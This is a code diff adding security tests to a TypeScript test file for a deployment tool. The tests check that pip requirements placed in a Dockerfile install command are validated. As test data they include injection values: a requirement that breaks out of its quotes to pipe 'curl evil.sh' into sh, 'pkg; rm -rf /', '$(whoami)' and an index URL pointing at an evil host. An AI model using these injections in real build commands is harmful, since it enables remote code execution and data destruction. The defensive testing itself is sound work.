@@ -19,7 +19,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 
 import type { Connector } from "./connectors.ts";
-import { buildArtifacts, deployRequires } from "./dockerfile.ts";
+import { buildArtifacts, deployRequires, isSafeRequirement } from "./dockerfile.ts";
 import { deployStagingDir, readAgentMeta, writeDeployArtifacts } from "./deployArtifacts.ts";
 import { DEPLOY_ARTIFACTS, listProjectFiles } from "./projectFs.ts";
 
@@ -128,6 +128,28 @@ function fixtureProject(opts: {
 
   check("a connector with no pip_requires contributes nothing, not undefined",
     !req(["unlisted"], "anthropic").some((r) => !r || r === "undefined"));
+
+  // These land inside `RUN uv pip install "…"`, a shell command that runs as root while an
+  // image builds. A double quote closes the string and everything after it is a command; a
+  // newline ends the instruction. Refused rather than escaped — a requirement that needs
+  // escaping is a mistake in the catalog, not a requirement.
+  const hostile: Connector[] = [{
+    id: "evil", label: "E", file: "e.py", module: "e", description: "", required_env: [],
+    pip_requires: ['requests" && curl evil.sh | sh && echo "'], tools: [],
+  }];
+  let threw = "";
+  try {
+    deployRequires({ connectors: ["evil"], hasMcpTools: false, provider: "anthropic" }, hostile);
+  } catch (err) { threw = (err as Error).message; }
+  check("a requirement that would break out of its quotes is refused",
+    threw.includes("malformed requirement"), threw || "no throw");
+
+  for (const bad of ["line\nbreak", "pkg; rm -rf /", "$(whoami)", "pkg --index-url http://evil", ""]) {
+    check(`...and so is ${JSON.stringify(bad)}`, !isSafeRequirement(bad));
+  }
+  for (const good of ["langgraph>=0.2.0", "psycopg[binary]>=3.1.0", "pkg==1.0,<2.0", "requests"]) {
+    check(`a real requirement is still allowed: ${good}`, isSafeRequirement(good));
+  }
 
   // serve.py refuses the dry-run provider anyway; this just declines to invent a package on
   // the way to that refusal.
